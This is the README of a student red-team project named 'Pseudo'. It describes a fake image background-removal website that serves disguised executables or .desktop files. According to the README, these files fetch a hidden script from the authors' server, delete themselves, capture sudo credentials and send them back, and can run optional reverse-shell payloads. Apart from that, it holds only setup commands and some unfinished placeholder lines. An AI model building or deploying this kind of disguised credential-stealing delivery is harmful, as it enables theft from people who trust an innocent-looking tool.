[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/am3xLbu5)
# Pseudo
 
## Authors

Abel Bellows, Michael Avrahami, Stanley Hoo
       
## Ethical Disclaimer

This project is a **red-team simulation** created strictly for **educational purposes** as part of our cybersecurity's class final project. The goal is to demonstrate how social engineering and obfuscated file execution can be used to bypass user expectations and install unknown background scripts or viruses. No part of this project should be used maliciously, and the authors do **not** condone unauthorized access, data collection, or exploitation in any context.

## Project Description:

**Pseudo** is a proof-of-concept web-based attack vector posing as an image background remover tool. Users upload an image to remove its background and are given a disguised `.exe` (Windows) or `.desktop` (Linux) file that appears to be the processed image.

When opened, the executable:
- Downloads and opens the background-removed image to avoid suspicion.
- Executes a hidden script (`runme`) from our server.
- Deletes itself to avoid detection.
- Collects system credentials upon `sudo` usage (on Linux or WSL for Windows) and sends them back to the web server.
- Supports optional reverse shell payloads via compiled C binaries.
  
## Instructions:

Visit our website [https://cyber.stanleyhoo1.tech](https://cyber.stanleyhoo1.tech), upload an image, and download the result. Opening the downloaded file will execute the hidden script and display the image.

> This tool is only intended for use by project reviewers or classmates as part of the educational evaluation. Do not distribute or run on unauthorized systems.

---

### Local Installation Guide (Optional)

1. Clone this repository:
    ```bash
    git clone git@github.com:Stuycs-K/finalproject-10-bellows-a-hoo-s-avrahami-m.git
    cd finalproject-10-bellows-a-hoo-s-avrahami-m
    ```

2. Create and activate a virtual environment:
    ```bash
    python3 -m venv VENV_NAME
    source VENV_NAME/bin/activate
    ```

3. Install dependencies:
    ```bash
    pip install -r requirements.txt
    ```

4. Download [Bat_To_Exe_Converter](https://en.softonic.com/download/bat-to-exe-converter-x64/windows/post-download?dt=internalDownload).

5. If on Linux, install Wine and required utilities:
    ```bash
    sudo apt install -y wine64 wine32 winbind xvfb unzip
    ```

6. Navigate into the Flask app:
    ```bash
    cd app
    ```

7. Update the following paths in your code:
    - In `convert_exe.py`, update `BAT_TO_EXE_PATH` to your absolute path to `Bat_To_Exe_Converter_x64.exe`.
    - In `app.py`, update the `subprocess.run(...)` call (line 201) to reflect the full path to `convert_exe.py`.

8. Run the Flask app:
    ```bash
    python3 app.py
    ```

9. Visit `http://localhost:5000` or your domain to interact with the tool.

### C Payloads (Optional)

You can also just test the C-based payloads by following the following instructions:

1. Clone this repository:
    ```bash
    git clone git@github.com:Stuycs-K/finalproject-10-bellows-a-hoo-s-avrahami-m.git
    cd finalproject-10-bellows-a-hoo-s-avrahami-m/c_scripts
    ```

2. Compile the payloads using the makefile


How does the user install/compile/run the program. (CHANGE THIS!!!!!)
How does the user interact with this program? (CHANGE THIS!!!!!)

---

## Resources/ References:

* [Background Remover](https://github.com/nadermx/backgroundremover): Used to remove the backgrounds from images
* [Bat to EXE Converter](https://en.softonic.com/download/bat-to-exe-converter-x64/windows/post-download?dt=internalDownload): Used to convert the batfiles to exe files for Windows
* [Self delete Batfile](https://superuser.com/a/1816768): Used to help figure out to self delete exe after running
* [Tutorial 1](https://learn.openwaterfoundation.org/owf-learn-windows-shell/batch-file-basics/batch-file-basics/), [Tutorial 2](https://www.tutorialspoint.com/batch_script/batch_script_files.html): Tutorials for learning batfile syntax
* [Execute Scripts on Click](https://askubuntu.com/questions/138908/how-to-execute-a-script-just-by-double-clicking-like-exe-files-in-windows): Used to figure out how to execute scripts simply from opening a file
* [Source 1](https://docs.fileformat.com/settings/desktop/), [Source 2](https://www.baeldung.com/linux/desktop-entry-files), [Source 3](https://wiki.archlinux.org/title/Desktop_entries), [Source 4](https://askubuntu.com/questions/5172/running-a-desktop-file-in-the-terminal): Sources used to figure out desktop file syntax
* [Download Multiple Files on Click](https://stackoverflow.com/a/54200538): Used to figure out how to download multiple files from clicking a button once